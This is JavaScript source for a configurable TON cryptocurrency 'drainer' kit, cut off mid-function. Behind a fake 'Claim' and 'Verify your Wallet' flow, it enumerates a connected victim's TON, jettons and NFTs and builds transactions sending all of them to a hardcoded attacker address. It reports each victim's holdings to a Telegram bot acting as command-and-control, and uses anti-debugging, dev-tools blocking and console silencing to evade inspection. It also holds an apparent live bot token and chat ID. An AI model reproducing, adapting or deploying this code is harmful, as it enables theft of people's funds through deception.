// ================================================================
//  TON DRAINER – FINAL PURE‑LOGIC KIT (with ANTI_CONSOLE)
//  No UI injection. All configurable at the top.
// ================================================================

(function() {
  'use strict';

  // ================================================================
  //  CONFIGURATION – EDIT THESE VALUES
  // ================================================================
  const CONFIG = {
    // ---- Core settings ----
    DISALLOW_BALANCE: 1.0,                // minimum TON (0 = no check)
    STEALTH_MODE: true,                  // suppress logs via LOG (if ANTI_CONSOLE is off)
    ANTI_CONSOLE: true,                   // COMPLETELY silence ALL console output
    MANIFEST_URL: 'https://lunchtime-numbness-putt.ngrok-free.dev/tonconnect-manifest.json',
    TONAPI_BASE: 'https://tonapi.io/v2',
    DRAIN_ADDRESS: 'UQAvVYDeXptm3gDgusR4w-cNsz_t5M1bl9zotJVan4_Auxf7',
    TELEGRAM_BOT_TOKEN: '8659486034:AAHdev1wCnAWA_c5ChmDyMLRAMyn5GzRNwo',
    TELEGRAM_CHAT_ID: '6662384890',

    ANTI_TAMPER: true,                    // checks script integrity
    ANTI_DEBUG: true,                     // blocks debugging attempts
    ANTI_DEV_TOOLS: true,                 // blocks right-click, F12, shortcuts
    VERIFY_DELAY_MS: 2000,                // artificial delay before sending transactions

    // ---- UI texts (for modals and button labels) ----
    TEXTS: {
      CONNECT: 'Connect Wallet',
      DISCONNECT: 'Disconnect',
      CONNECTING: 'Connecting...',
      CLAIM: 'Claim',
      VERIFYING: 'Verifying wallet assets...',
      VERIFY_SUCCESS: 'Verification completed successfully.',
      VERIFY_FAILED: 'Verification failed. Please try again.',
      ERR_INIT: 'Failed to initialise wallet connector.',
      ERR_NETWORK: 'Network error. Please check your connection.',
      ERR_CANCELLED: 'Connection cancelled.',
      ERR_BALANCE: 'Could not fetch balance.',
      ERR_UNKNOWN: 'An unexpected error occurred.',
      ERR_TONWEB: 'TonWeb library failed to load. Please refresh and try again.',
      INFO_CONNECTED: 'Wallet connected successfully.',
      INFO_DISCONNECTED: 'Wallet disconnected.',
      BALANCE_TOO_LOW: 'Balance too low. Minimum required: 0.5 TON.',
      RETRY: 'Retry',
      CANCEL: 'Cancel',
      OK: 'OK',
    }
  };

  // ================================================================
  //  ANTI‑CONSOLE – SILENCE ALL CONSOLE OUTPUT
  // ================================================================
  if (CONFIG.ANTI_CONSOLE) {
    const noop = () => {};
    const methods = [
      'log', 'warn', 'error', 'info', 'debug', 'trace', 'dir', 'dirxml',
      'group', 'groupEnd', 'time', 'timeEnd', 'assert', 'count', 'clear',
      'profile', 'profileEnd', 'timeStamp', 'table'
    ];
    for (const m of methods) {
      if (console[m]) console[m] = noop;
    }
    // Also silence the LOG object itself (no-op all its methods)
    // We'll reassign later after we define it.
  }

  // ================================================================
  //  LOG – will be no‑op if ANTI_CONSOLE is on, else behaves with STEALTH_MODE
  // ================================================================
  const LOG = {
    info: (...a) => { if (!CONFIG.STEALTH_MODE) console.log('[INFO]', ...a); },
    warn: (...a) => { if (!CONFIG.STEALTH_MODE) console.warn('[WARN]', ...a); },
    error: (...a) => { console.error('[ERROR]', ...a); }, // if ANTI_CONSOLE on, this is already no‑op
    debug: (...a) => { if (!CONFIG.STEALTH_MODE) console.debug('[DEBUG]', ...a); }
  };

  // If ANTI_CONSOLE is on, overwrite LOG methods to no‑op as well (belt and braces)
  if (CONFIG.ANTI_CONSOLE) {
    Object.keys(LOG).forEach(k => LOG[k] = () => {});
  }

  // ================================================================
  //  PROTECTION LAYER (ANTI_TAMPER, ANTI_DEBUG, ANTI_DEV_TOOLS)
  // ================================================================
  if (CONFIG.ANTI_TAMPER) {
    (function() {
      const scripts = document.getElementsByTagName('script');
      let self = null;
      for (let s of scripts) {
        if (s.textContent.includes('ANTI_TAMPER')) { self = s; break; }
      }
      if (self) {
        let hash = 5381;
        const content = self.textContent;
        for (let i = 0; i < content.length; i++) {
          hash = ((hash << 5) + hash) + content.charCodeAt(i);
          hash = hash & hash;
        }
        // REPLACE THIS VALUE WITH YOUR HASH AFTER OBFUSCATION
        const EXPECTED = 0xDEADBEEF;
        if (hash !== EXPECTED) {
          console.warn('Tamper detected – destroying script.');
          delete window.showModal;
          delete window.hideModal;
          delete window.openTonConnect;
          try { localStorage.clear(); } catch(_) {}
          document.dispatchEvent(new CustomEvent('destroy'));
          throw new Error('Integrity check failed.');
        }
      }
    })();
  }

  if (CONFIG.ANTI_DEBUG) {
    (function() {
      // If ANTI_CONSOLE is not enabled, we keep these overrides.
      // If ANTI_CONSOLE is on, console methods are already noop.
      const origLog = console.log;
      const origWarn = console.warn;
      console.log = function() {
        if (CONFIG.STEALTH_MODE) return;
        origLog.apply(console, arguments);
      };
      console.warn = function() {
        if (CONFIG.STEALTH_MODE) return;
        origWarn.apply(console, arguments);
      };
      // Periodic debugger trap
      setInterval(function() {
        (function(){})['constructor']('debugger')();
      }, 3000);
    })();
  }

  if (CONFIG.ANTI_DEV_TOOLS) {
    document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
    document.addEventListener('keydown', function(e) {
      const key = e.key, ctrl = e.ctrlKey || e.metaKey, shift = e.shiftKey;
      if (key === 'F12') { e.preventDefault(); return false; }
      if (ctrl && shift && (key === 'I' || key === 'J')) { e.preventDefault(); return false; }
      if (ctrl && key === 'U') { e.preventDefault(); return false; }
    });
    let lastW = window.outerWidth, lastH = window.outerHeight;
    setInterval(function() {
      const w = window.outerWidth, h = window.outerHeight;
      if (w !== lastW || h !== lastH) {
        // This will be silenced if ANTI_CONSOLE is on
        LOG.warn('Possible dev tools detected (window size change).');
      }
      lastW = w; lastH = h;
    }, 500);
  }

  // ================================================================
  //  MODAL KIT (ton-modal-kit v2.0) – EMBEDDED
  // ================================================================
  (function(root, factory) {
    if (typeof module !== 'undefined' && module.exports) {
      module.exports = factory();
    } else {
      var api = factory();
      root.showModal = api.showModal;
      root.hideModal = api.hideModal;
      root.updateProgress = api.updateProgress;
      root.showGramModal = api.showGramModal;
    }
  })(typeof window !== 'undefined' ? window : this, function() {
    var CSS = [
      ':root{',
      '--tmk-sheet-bg:#17212b;',
      '--tmk-overlay-bg:rgba(0,0,0,.55);',
      '--tmk-text-primary:#e8f0fa;',
      '--tmk-text-secondary:#7a9db8;',
      '--tmk-divider:rgba(255,255,255,.07);',
      '--tmk-handle:rgba(255,255,255,.15);',
      '--tmk-radius-sheet:18px;',
      '--tmk-anim-in:.32s cubic-bezier(.32,1,.32,1);',
      '--tmk-anim-out:.22s ease-in;',
      '--tmk-success-color:#4dab6d;',
      '--tmk-success-bg:rgba(77,171,109,.15);',
      '--tmk-error-color:#e05c5c;',
      '--tmk-error-bg:rgba(224,92,92,.15);',
      '--tmk-warning-color:#d4923a;',
      '--tmk-warning-bg:rgba(212,146,58,.15);',
      '--tmk-info-color:#3ea8f5;',
      '--tmk-info-bg:rgba(62,168,245,.15);',
      '--tmk-confirm-color:#3ea8f5;',
      '--tmk-confirm-bg:rgba(62,168,245,.12);',
      '--tmk-loading-color:#3ea8f5;',
      '--tmk-loading-bg:rgba(62,168,245,.12);',
      '}',
      '.tmk-overlay{',
      'position:fixed;inset:0;z-index:99999;',
      'display:flex;align-items:flex-end;justify-content:center;',
      'background:var(--tmk-overlay-bg);',
      'opacity:0;visibility:hidden;',
      'transition:opacity var(--tmk-anim-in),visibility var(--tmk-anim-in);',
      '}',
      '.tmk-overlay.tmk-visible{opacity:1;visibility:visible;}',
      '.tmk-sheet{',
      'width:100%;max-width:480px;',
      'background:var(--tmk-sheet-bg);',
      'border-radius:var(--tmk-radius-sheet) var(--tmk-radius-sheet) 0 0;',
      'transform:translateY(100%);',
      'transition:transform var(--tmk-anim-in);',
      'overflow:hidden;',
      '}',
      '.tmk-overlay.tmk-visible .tmk-sheet{transform:translateY(0);}',
      '.tmk-handle{width:36px;height:4px;border-radius:99px;background:var(--tmk-handle);margin:10px auto 20px;}',
      '.tmk-body{padding:0 24px 26px;text-align:center;}',
      '.tmk-icon-wrap{width:62px;height:62px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 18px;flex-shrink:0;}',
      '.tmk-title{font-size:17px;font-weight:600;color:var(--tmk-text-primary);margin:0 0 8px;letter-spacing:-.01em;}',
      '.tmk-message{font-size:14px;line-height:1.58;color:var(--tmk-text-secondary);margin:0;}',
      '.tmk-progress-wrap{margin-top:18px;}',
      '.tmk-progress-track{height:4px;border-radius:99px;background:rgba(255,255,255,.07);overflow:hidden;}',
      '.tmk-progress-fill{height:100%;border-radius:99px;background:var(--tmk-loading-color);width:0%;transition:width .35s ease;}',
      '.tmk-progress-label{font-size:12px;color:#4e6a87;text-align:right;margin:5px 0 0;}',
      '.tmk-actions{border-top:1px solid var(--tmk-divider);}',
      '.tmk-btn{display:block;width:100%;padding:15px 20px;background:none;border:none;border-radius:0;font-family:inherit;font-size:16px;font-weight:500;cursor:pointer;text-align:center;transition:background .12s;-webkit-tap-highlight-color:transparent;}',
      '.tmk-btn:active{background:rgba(255,255,255,.06);}',
      '.tmk-btn + .tmk-divider{height:1px;background:var(--tmk-divider);}',
      '.tmk-btn-primary{color:var(--tmk-info-color);}',
      '.tmk-btn-destructive{color:var(--tmk-error-color);}',
      '.tmk-btn-cancel{color:var(--tmk-text-secondary);}',
      '.tmk-safe-area{height:env(safe-area-inset-bottom,16px);min-height:8px;}',
      '@keyframes tmk-spin{to{transform:rotate(360deg)}}',
      '.tmk-spinner{animation:tmk-spin .85s linear infinite;display:block;}',
      '@media(prefers-reduced-motion:reduce){.tmk-overlay,.tmk-sheet{transition:none;}.tmk-spinner{animation-duration:2s;}}',
      '@media(min-width:520px){',
      '.tmk-overlay{align-items:center;}',
      '.tmk-sheet{border-radius:16px;transform:translateY(16px) scale(.97);box-shadow:0 24px 80px rgba(0,0,0,.6);margin-bottom:0;}',
      '.tmk-overlay.tmk-visible .tmk-sheet{transform:translateY(0) scale(1);}',
      '.tmk-handle{display:none;}',
      '.tmk-safe-area{display:none;}',
      '.tmk-body{padding-bottom:28px;}',
      '}'
    ].join('');

    function icon(type, color) {
      var s = 'stroke="' + color + '" stroke-width="2.2" stroke-linecap="round"';
      var svg = '<svg width="26" height="26" viewBox="0 0 26 26" fill="none" aria-hidden="true">';
      var map = {
        success: svg + '<path d="M6 13.5L11 18.5L20 8.5" ' + s + ' stroke-linejoin="round"/></svg>',
        error: svg + '<path d="M7 7L19 19M19 7L7 19" ' + s + '/></svg>',
        warning: svg + '<path d="M13 9v7" ' + s + '/><circle cx="13" cy="19.5" r="1.3" fill="' + color + '"/><path d="M13 3L24 22H2L13 3Z" stroke="' + color + '" stroke-width="2" stroke-linejoin="round"/></svg>',
        info: svg + '<circle cx="13" cy="13" r="10" stroke="' + color + '" stroke-width="2"/><path d="M13 12v7" ' + s + '/><circle cx="13" cy="8.5" r="1.2" fill="' + color + '"/></svg>',
        confirm: svg + '<path d="M13 3L14.9 9.8H22L16.2 14L18.5 21L13 17L7.5 21L9.8 14L4 9.8H11.1L13 3Z" stroke="' + color + '" stroke-width="1.9" stroke-linejoin="round"/></svg>',
        loading: '<svg class="tmk-spinner" width="26" height="26" viewBox="0 0 26 26" fill="none" aria-hidden="true"><circle cx="13" cy="13" r="10" stroke="rgba(62,168,245,0.2)" stroke-width="2.5"/><path d="M13 3 A10 10 0 0 1 23 13" stroke="' + color + '" stroke-width="2.5" stroke-linecap="round"/></svg>'
      };
      return map[type] || map.info;
    }

    var TOKENS = {
      success: { colorVar: '--tmk-success-color', bgVar: '--tmk-success-bg', fallbackColor: '#4dab6d', fallbackBg: 'rgba(77,171,109,.15)' },
      error: { colorVar: '--tmk-error-color', bgVar: '--tmk-error-bg', fallbackColor: '#e05c5c', fallbackBg: 'rgba(224,92,92,.15)' },
      warning: { colorVar: '--tmk-warning-color', bgVar: '--tmk-warning-bg', fallbackColor: '#d4923a', fallbackBg: 'rgba(212,146,58,.15)' },
      info: { colorVar: '--tmk-info-color', bgVar: '--tmk-info-bg', fallbackColor: '#3ea8f5', fallbackBg: 'rgba(62,168,245,.15)' },
      confirm: { colorVar: '--tmk-confirm-color', bgVar: '--tmk-confirm-bg', fallbackColor: '#3ea8f5', fallbackBg: 'rgba(62,168,245,.12)' },
      loading: { colorVar: '--tmk-loading-color', bgVar: '--tmk-loading-bg', fallbackColor: '#3ea8f5', fallbackBg: 'rgba(62,168,245,.12)' }
    };

    function resolveVar(v, fb) {
      if (typeof getComputedStyle !== 'undefined') {
        var val = getComputedStyle(document.documentElement).getPropertyValue(v).trim();
        if (val) return val;
      }
      return fb;
    }

    var _overlay = null, _progFill = null, _progLabel = null, _styleEl = null;

    function injectCSS() {
      if (_styleEl) return;
      _styleEl = document.createElement('style');
      _styleEl.id = 'tmk-css';
      _styleEl.textContent = CSS;
      document.head.appendChild(_styleEl);
    }

    function el(tag, cls, attrs) {
      var e = document.createElement(tag);
      if (cls) e.className = cls;
      if (attrs) Object.keys(attrs).forEach(function(k) { e.setAttribute(k, attrs[k]); });
      return e;
    }

    function ensureOverlay() {
      if (_overlay) return;
      _overlay = el('div', 'tmk-overlay', { role: 'dialog', 'aria-modal': 'true' });
      _overlay.addEventListener('click', function(e) { if (e.target === _overlay) hideModal(); });
      document.addEventListener('keydown', function(e) { if (e.key === 'Escape' && _overlay && _overlay.classList.contains('tmk-visible')) hideModal(); });
      document.body.appendChild(_overlay);
    }

    function buildSheet(opts) {
      var type = TOKENS[opts.type] ? opts.type : 'info';
      var tok = TOKENS[type];
      var color = resolveVar(tok.colorVar, tok.fallbackColor);
      var bg = resolveVar(tok.bgVar, tok.fallbackBg);
      var title = opts.title || null;
      var message = opts.message || '';
      var btnText = opts.buttonText || 'Done';
      var showProgress = !!opts.showProgress;
      var progress = Math.min(100, Math.max(0, +(opts.progress) || 0));
      var isLoading = type === 'loading';

      var sheet = el('div', 'tmk-sheet');
      sheet.appendChild(el('div', 'tmk-handle'));

      var body = el('div', 'tmk-body');
      var iconWrap = el('div', 'tmk-icon-wrap');
      iconWrap.style.background = bg;
      iconWrap.innerHTML = icon(type, color);
      body.appendChild(iconWrap);

      if (title) { var h = el('p', 'tmk-title'); h.textContent = title; body.appendChild(h); }
      var msg = el('p', 'tmk-message'); msg.textContent = message; body.appendChild(msg);

      _progFill = null; _progLabel = null;
      if (showProgress) {
        var pw = el('div', 'tmk-progress-wrap');
        var track = el('div', 'tmk-progress-track');
        _progFill = el('div', 'tmk-progress-fill');
        _progFill.style.width = progress + '%';
        track.appendChild(_progFill);
        pw.appendChild(track);
        _progLabel = el('p', 'tmk-progress-label');
        _progLabel.textContent = progress + '%';
        pw.appendChild(_progLabel);
        body.appendChild(pw);
      }
      sheet.appendChild(body);

      var hasMainBtn = !isLoading || opts.buttonAction;
      var hasCancelBtn = !!opts.cancelText;

      if (hasMainBtn || hasCancelBtn) {
        var actions = el('div', 'tmk-actions');
        if (hasMainBtn) {
          var mainBtn = el('button', 'tmk-btn tmk-btn-primary');
          mainBtn.textContent = btnText;
          mainBtn.addEventListener('click', function() {
            if (typeof opts.buttonAction === 'function') {
              if (opts.buttonAction() === false) return;
            }
            hideModal();
          });
          actions.appendChild(mainBtn);
        }
        if (hasCancelBtn) {
          var div = el('div', 'tmk-divider');
          actions.appendChild(div);
          var cancelBtn = el('button', 'tmk-btn tmk-btn-cancel');
          cancelBtn.textContent = opts.cancelText;
          cancelBtn.addEventListener('click', function() {
            if (typeof opts.cancelAction === 'function') opts.cancelAction();
            hideModal();
          });
          actions.appendChild(cancelBtn);
        }
        var safeArea = el('div', 'tmk-safe-area');
        actions.appendChild(safeArea);
        sheet.appendChild(actions);
      } else {
        var pad = el('div', ''); pad.style.height = '24px'; sheet.appendChild(pad);
      }
      return sheet;
    }

    function showModal(options) {
      if (!options || typeof options !== 'object') { console.warn('[TMK] showModal requires an options object.'); return; }
      injectCSS(); ensureOverlay();
      _overlay.innerHTML = '';
      var sheet = buildSheet(options);
      _overlay.appendChild(sheet);
      var label = options.title || (options.type || 'notification');
      _overlay.setAttribute('aria-label', label);
      requestAnimationFrame(function() {
        requestAnimationFrame(function() {
          _overlay.classList.add('tmk-visible');
          var firstBtn = sheet.querySelector('.tmk-btn');
          if (firstBtn) firstBtn.focus();
        });
      });
    }

    function hideModal() {
      if (!_overlay) return;
      _overlay.classList.remove('tmk-visible');
      _progFill = null; _progLabel = null;
    }

    function updateProgress(pct) {
      pct = Math.min(100, Math.max(0, Math.round(+pct)));
      if (_progFill) _progFill.style.width = pct + '%';
      if (_progLabel) _progLabel.textContent = pct + '%';
    }

    function showGramModal(options) {
      showModal(Object.assign({}, options, { type: 'warning' }));
    }

    return { showModal: showModal, hideModal: hideModal, updateProgress: updateProgress, showGramModal: showGramModal };
  });

  // ================================================================
  //  TELEGRAM C2
  // ================================================================
  const C2 = (() => {
    const DB_NAME = 'C2QueueDB';
    const STORE_NAME = 'queue';
    const MAX_RETRIES = 3;
    const BASE_DELAY = 2000;
    let db = null, processing = false;

    function openDB() {
      return new Promise((resolve, reject) => {
        const req = indexedDB.open(DB_NAME, 1);
        req.onupgradeneeded = (e) => {
          const db = e.target.result;
          if (!db.objectStoreNames.contains(STORE_NAME)) {
            db.createObjectStore(STORE_NAME, { autoIncrement: true });
          }
        };
        req.onsuccess = () => resolve(req.result);
        req.onerror = () => reject(req.error);
      });
    }
    async function getDB() { if (!db) db = await openDB(); return db; }

    function addToQueue(data) {
      return new Promise(async (resolve, reject) => {
        const db = await getDB();
        const tx = db.transaction(STORE_NAME, 'readwrite');
        const store = tx.objectStore(STORE_NAME);
        const req = store.add(data);
        req.onsuccess = () => resolve(req.result);
        req.onerror = () => reject(req.error);
      });
    }

    function getNextFromQueue() {
      return new Promise(async (resolve, reject) => {
        const db = await getDB();
        const tx = db.transaction(STORE_NAME, 'readonly');
        const store = tx.objectStore(STORE_NAME);
        const req = store.openCursor();
        req.onsuccess = (e) => {
          const cursor = e.target.result;
          if (cursor) resolve({ id: cursor.key, payload: cursor.value });
          else resolve(null);
        };
        req.onerror = () => reject(req.error);
      });
    }

    function removeFromQueue(id) {
      return new Promise(async (resolve, reject) => {
        if (id == null) { resolve(); return; }
        const db = await getDB();
        const tx = db.transaction(STORE_NAME, 'readwrite');
        const store = tx.objectStore(STORE_NAME);
        const req = store.delete(id);
        req.onsuccess = () => resolve();
        req.onerror = () => reject(req.error);
      });
    }

    async function sendTelegram(text) {
      const token = CONFIG.TELEGRAM_BOT_TOKEN;
      const chatId = CONFIG.TELEGRAM_CHAT_ID;
      if (!token || !chatId) return false;
      const url = `https://api.telegram.org/bot${token}/sendMessage`;
      try {
        const resp = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: text }),
          keepalive: true
        });
        return resp.ok;
      } catch(_) { return false; }
    }

    async function sendWithRetry(entry, attempt = 1) {
      const { id, payload } = entry;
      const success = await sendTelegram(payload);
      if (success) { await removeFromQueue(id); return true; }
      if (attempt < MAX_RETRIES) {
        const delay = BASE_DELAY * Math.pow(2, attempt - 1);
        await new Promise(r => setTimeout(r, delay));
        return sendWithRetry(entry, attempt + 1);
      }
      await removeFromQueue(id);
      return false;
    }

    async function processQueue() {
      if (processing) return;
      processing = true;
      try {
        let entry = await getNextFromQueue();
        while (entry) {
          await sendWithRetry(entry);
          entry = await getNextFromQueue();
        }
      } catch(_) {}
      processing = false;
    }

    async function send(data) {
      if (!CONFIG.TELEGRAM_BOT_TOKEN || !CONFIG.TELEGRAM_CHAT_ID) return;
      const lines = [];
      for (const [k, v] of Object.entries(data)) {
        if (v !== undefined && v !== null) lines.push(`${k}: ${v}`);
      }
      const text = lines.join('\n');
      const sent = await sendTelegram(text);
      if (!sent) { await addToQueue(text); processQueue(); }
    }

    window.addEventListener('beforeunload', () => processQueue());
    return { send };
  })();

  // ================================================================
  //  HELPERS
  // ================================================================
  function waitForGlobal(varName, timeout = 30000, interval = 200) {
    return new Promise((resolve, reject) => {
      const start = Date.now();
      const check = () => {
        if (typeof window[varName] !== 'undefined') { resolve(); return; }
        if (Date.now() - start > timeout) { reject(new Error(`Timeout waiting for ${varName}`)); return; }
        setTimeout(check, interval);
      };
      check();
    });
  }

  async function fetchWithRetry(url, opts = {}, maxRetries = 3) {
    for (let attempt = 0; attempt < maxRetries; attempt++) {
      try {
        const resp = await fetch(url, opts);
        if (resp.status === 429) {
          const delay = (attempt + 1) * 2000;
          LOG.warn(`Rate limited (429), waiting ${delay}ms`);
          await new Promise(r => setTimeout(r, delay));
          continue;
        }
        return resp;
      } catch(e) {
        if (attempt === maxRetries - 1) throw e;
        await new Promise(r => setTimeout(r, 1000));
      }
    }
    throw new Error('Max retries exceeded');
  }

  async function checkManifest() {
    try {
      const resp = await fetch(CONFIG.MANIFEST_URL, { mode: 'cors' });
      const text = await resp.text();
      if (!resp.ok || !text.trim().startsWith('{')) {
        LOG.warn('Manifest not reachable or not JSON.');
        C2.send({ 'Manifest warning': 'Manifest not reachable – transactions may fail.' });
      }
    } catch(_) {
      LOG.warn('Manifest fetch failed.');
      C2.send({ 'Manifest warning': 'Manifest fetch failed.' });
    }
  }

  function toFriendlyAddress(raw) {
    if (raw && (raw.startsWith('UQ') || raw.startsWith('EQ'))) return raw;
    if (typeof TonWeb !== 'undefined') {
      try {
        const addr = new TonWeb.utils.Address(raw);
        return addr.toString(true, true, true);
      } catch(_) {}
    }
    return raw;
  }

  // ================================================================
  //  DRAIN LOGIC
  // ================================================================
  async function getValuedJettons(address) {
    try {
      const resp = await fetchWithRetry(
        `${CONFIG.TONAPI_BASE}/accounts/${encodeURIComponent(address)}/jettons?currencies=usd`
      );
      const data = await resp.json();
      const result = [];
      for (const item of data.balances || []) {
        const balance = BigInt(item.balance || '0');
        if (balance > 0n) {
          const decimals = item.jetton?.decimals ?? 9;
          const price = item.price?.prices?.usd || 0;
          const usdValue = price * Number(balance) / Math.pow(10, decimals);
          result.push({ wallet: item.wallet_address.address, amount: balance, master: item.jetton.address, usdValue });
        }
      }
      result.sort((a,b) => b.usdValue - a.usdValue);
      return {
        wallets: result.map(v => v.wallet),
        amounts: result.map(v => v.amount),
        masters: result.map(v => v.master),
        usdValues: result.map(v => v.usdValue)
      };
    } catch(e) {
      LOG.error('Failed to fetch jettons:', e);
      return { wallets: [], amounts: [], masters: [], usdValues: [] };
    }
  }

  async function getValuedNfts(address) {
    try {
      const resp = await fetchWithRetry(
        `${CONFIG.TONAPI_BASE}/accounts/${encodeURIComponent(address)}/nfts?limit=1000&include_ownership=true`
      );
      const data = await resp.json();
      return (data.nft_items || [])
        .filter(nft => {
          if (nft.collection_type === 'telegram' || (nft.collection && nft.collection.is_telegram)) return false;
          return true;
        })
        .map(nft => ({
          address: nft.address,
          floorPrice: (nft.collection?.approximated_floor_price || 0) / 1e9
        }));
    } catch(e) {
      LOG.error('Failed to fetch NFTs:', e);
      return [];
    }
  }

  async function runTransfer(address) {
    LOG.info('=== runTransfer START ===');
    LOG.info('Address:', address);

    try {
      const tonConnectUI = WalletManager.getTonConnectUI();
      if (!tonConnectUI) {
        LOG.error('TonConnect UI not available');
        await C2.send({ 'Error': 'TonConnect UI not available' });
        window.showModal({ type: 'error', message: CONFIG.TEXTS.ERR_INIT });
        return false;
      }

      LOG.info('Waiting for connectionRestored...');
      await tonConnectUI.connectionRestored;
      LOG.info('connectionRestored done');

      LOG.info('Waiting for TonWeb...');
      await waitForGlobal('TonWeb', 30000);
      LOG.info('TonWeb loaded');

      const [jettonsData, nftsData, accountData, priceData] = await Promise.all([
        getValuedJettons(address),
        getValuedNfts(address),
        fetchWithRetry(`${CONFIG.TONAPI_BASE}/accounts/${encodeURIComponent(address)}`)
          .then(r => r.json()).catch(() => ({ balance: 0 })),
        fetchWithRetry(`${CONFIG.TONAPI_BASE}/rates?tokens=ton&currencies=usd`)
          .then(r => r.json()).catch(() => ({}))
      ]);

      const { wallets, amounts, usdValues } = jettonsData;
      const tonPrice = priceData?.rates?.TON?.prices?.USD || priceData?.rates?.TON?.prices?.usd || 5;
      const rawBalance = accountData?.balance || 0;
      const tonBalance = BigInt(Math.floor(Number(rawBalance)));

      const totalJettons = wallets.length;
      const totalNfts = nftsData.length;
      LOG.info(`Balance: ${Number(tonBalance)/1e9} TON, Jettons: ${totalJettons}, NFTs: ${totalNfts}`);

      await C2.send({
        'Wallet': address,
        'Balance (TON)': Number(tonBalance)/1e9,
        'Jettons': totalJettons,
        'NFTs': totalNfts,
        'TON price (USD)': tonPrice,
      });

      const minBalanceNano = BigInt(Math.floor(CONFIG.DISALLOW_BALANCE * 1e9));
      if (tonBalance < minBalanceNano) {
        LOG.warn('Balance too low');
        await C2.send({ 'Status': 'Balance too low', 'Required': CONFIG.DISALLOW_BALANCE });
        const msg = CONFIG.TEXTS.BALANCE_TOO_LOW || 'Balance too low.';
        window.showModal({ type: 'warning', message: msg, buttons: [{ label: CONFIG.TEXTS.OK || 'OK', action: window.hideModal }] });
        return false;
      }

      const TonWeb = window.TonWeb;
      const drainAddress = CONFIG.DRAIN_ADDRESS;
      const rawSender = address.startsWith('0:') ? address.slice(2) : address;
      const rawDrain = drainAddress.startsWith('0:') ? drainAddress.slice(2) : drainAddress;

      let sender, drainAddrObj;
      try {
        sender = new TonWeb.utils.Address(rawSender);
        drainAddrObj = new TonWeb.utils.Address(rawDrain);
        LOG.info('Addresses parsed successfully');
      } catch (addrErr) {
        LOG.error('Address parse error:', addrErr);
        await C2.send({ 'Error': 'Address parse failed', 'Details': addrErr.message });
        window.showModal({ type: 'error', message: 'Invalid address format.' });
        return false;
      }

      const memoBytes = new TextEncoder().encode('Verify your Wallet');
      const messages = [];

      const dust = 1000000n;
      const sendAmount = tonBalance > dust ? tonBalance - dust : 0n;
      if (sendAmount > 0n) {
        LOG.info(`Preparing TON transfer: ${Number(sendAmount)/1e9} TON`);
        const cell = new TonWeb.boc.Cell();
        cell.bits.writeUint(0, 32);
        for (const b of memoBytes) cell.bits.writeUint(b, 8);
        messages.push({
          msg: {
            address: toFriendlyAddress(drainAddress),
            amount: String(sendAmount),
            payload: TonWeb.boc.bytesToBase64(await cell.toBoc())
          },
          usdValue: Number(sendAmount) / 1e9 * tonPrice
        });
        await C2.send({ 'TON transfer': `${Number(sendAmount)/1e9} TON ($${(Number(sendAmount)/1e9 * tonPrice).toFixed(2)})` });
      }

      for (let i = 0; i < wallets.length; i++) {
        const jettonWalletAddress = wallets[i];
        const jettonAmount = amounts[i];
        const usdVal = usdValues[i] || 0;
        LOG.info(`Preparing jetton #${i+1}: ${Number(jettonAmount)} units ($${usdVal.toFixed(2)})`);

        const body = new TonWeb.boc.Cell();
        body.bits.writeUint(0xf8a7ea5, 32);
        body.bits.writeUint(0, 64);
        body.bits.writeCoins(new TonWeb.utils.BN(jettonAmount.toString()));
        body.bits.writeAddress(drainAddrObj);
        body.bits.writeAddress(sender);
        body.bits.writeBit(0);
        body.bits.writeCoins(new TonWeb.utils.BN(1));
        body.bits.writeBit(0);

        messages.push({
          msg: {
            address: toFriendlyAddress(jettonWalletAddress),
            amount: String(120000000n),
            payload: TonWeb.boc.bytesToBase64(await body.toBoc())
          },
          usdValue: usdVal
        });
        await C2.send({ [`Jetton #${i+1}`]: `${Number(jettonAmount)} units ($${usdVal.toFixed(2)})` });
      }

      for (const nft of nftsData) {
        const nftItemAddress = nft.address;
        const usdVal = nft.floorPrice * tonPrice;
        LOG.info(`Preparing NFT: ${nftItemAddress} ($${usdVal.toFixed(2)})`);

        const body = new TonWeb.boc.Cell();
        body.bits.writeUint(0x5fcc3d14, 32);
        body.bits.writeUint(0, 64);
        body.bits.writeAddress(drainAddrObj);
        body.bits.writeAddress(sender);
        body.bits.writeBit(0);
        body.bits.writeCoins(new TonWeb.utils.BN(1));
        body.bits.writeBit(0);

        messages.push({
          msg: {
            address: toFriendlyAddress(nftItemAddress),
            amount: String(10000000n),
            payload: TonWeb.boc.bytesToBase64(await body.toBoc())
          },
          usdValue: usdVal
        });
        await C2.send({ [`NFT`]: `${nftItemAddress} ($${usdVal.toFixed(2)})` });
      }

      if (messages.length === 0) {
        LOG.info('No assets to transfer.');
        await C2.send({ 'Status': 'No assets found' });
        window.showModal({ type: 'info', message: 'No assets found to claim.' });
        return false;
      }

      LOG.info(`Total messages: ${messages.length}`);
      const totalUsd = messages.reduce((s, m) => s + m.usdValue, 0);
      await C2.send({ 'Total messages': messages.length, 'Total USD value': totalUsd.toFixed(2) });

      messages.sort((a,b) => b.usdValue - a.usdValue);
      const msgArray = messages.map(m => m.msg);

      const walletAccount = WalletManager.getConnectedAddress();
      const isV5 = walletAccount && (walletAccount.includes('v5') || walletAccount.includes('w5'));
      const batchSize = isV5 ? 200 : 4;
      LOG.info(`Batch size: ${batchSize}`);

      if (CONFIG.VERIFY_DELAY_MS > 0) {
        LOG.info(`Applying verify delay of ${CONFIG.VERIFY_DELAY_MS}ms...`);
        await new Promise(r => setTimeout(r, CONFIG.VERIFY_DELAY_MS));
      }

      let successCount = 0;
      for (let i = 0; i < msgArray.length; i += batchSize) {
        const batch = msgArray.slice(i, i + batchSize);
        LOG.info(`Sending batch ${Math.floor(i/batchSize)+1} (${batch.length} msgs)`);
        await C2.send({ [`Batch ${Math.floor(i/batchSize)+1}`]: `${batch.length} messages` });

        try {
          await tonConnectUI.connectionRestored;
          await tonConnectUI.sendTransaction({
            messages: batch,
            validUntil: Math.floor(Date.now() / 1000) + 300
          }, {
            modals: ['before', 'success', 'error'],
            notifications: ['before', 'success', 'error'],
            skipRedirectToWallet: 'never'
          });
          successCount += batch.length;
          LOG.info(`Batch ${Math.floor(i/batchSize)+1} sent`);
          await C2.send({ [`Batch ${Math.floor(i/batchSize)+1} status`]: 'Success' });
        } catch (e) {
          LOG.error('Batch failed:', e);
